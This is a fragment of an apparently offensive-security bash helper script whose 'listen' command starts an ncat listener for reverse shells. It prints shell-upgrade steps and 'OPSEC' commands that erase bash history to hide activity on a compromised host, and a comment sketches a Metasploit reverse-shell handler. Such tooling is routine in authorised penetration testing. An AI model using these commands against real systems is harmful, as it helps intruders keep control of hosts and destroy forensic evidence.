## l(isten) [port]^: ncat -vlkp PORT
if [[ "$1" =~ ^l(isten)?$ ]]; then
  CMD="ncat"
  export INSTCMD="apt install ncat -y"
  checkCmd

  PORT="9001"
  if [ "$#" -eq 2 ]; then
    if [[ "$2" =~ ^[0-9]+$ ]]; then
      PORT="$2"
    else
      echo "${warn} Port is not a number!"; exit
    fi
  fi

  CMD="$CMD -vlkp $PORT"

  # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
  echo "${info} Shell upgrade instructions:"
  echo "    python -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "    python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  echo "    Ctrl-z"
  echo "    stty raw -echo"
  echo "    fg + [Enter x 2]"
  echo -n "    export SHELL=/bin/bash; export TERM=$TERM;"
  ROWS="$(stty -a | grep -oE "rows [0-9]{1,}" | cut -d' ' -f2)"
  COLS="$(stty -a | grep -oE "columns [0-9]{1,}" | cut -d' ' -f2)"
  echo -e " stty rows $ROWS columns $COLS\n"
  # https://attack.mitre.org/techniques/T1070/003/
  echo "${info} OPSEC Linux:"
  echo "    unset HISTFILE; export HISTFILESIZE=0;"
  echo "    # make sure to check history before deleting!"
  echo -e "    history -c; rm ~/.bash_history\n"
  echo "${bldwht}> $CMD${txtrst}"
  bash -c "$CMD"
  exit
fi

# 2DO:
# - msf
# msfconsole -x "use exploit/multi/handler;\
# set PAYLOAD generic/shell_reverse_tcp;\
# set LHOST $IP;\
# set LPORT $PORT;\
# run"
# - socat
